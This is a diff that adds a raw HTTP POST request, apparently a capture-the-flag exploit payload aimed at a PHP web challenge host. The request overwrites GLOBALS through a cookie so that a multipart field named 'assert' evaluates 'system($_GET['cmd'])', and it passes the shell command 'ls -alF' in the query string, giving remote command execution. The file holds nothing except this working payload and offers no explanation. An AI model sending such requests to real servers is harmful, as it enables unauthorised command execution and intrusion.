@@ -1,0 +1,13 @@
+POST /?cmd=ls+-alF HTTP/1.0
+Host: wildwildweb.fluxfingers.net:1425
+Cookie: GLOBALS=assert
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=--mijnensbathias
+Content-Length: 148
+
+----mijnensbathias
+Content-Disposition: form-data; name="assert"; filename="empty"
+Content-Type: system($_GET['cmd']);
+
+
+----mijnensbathias--
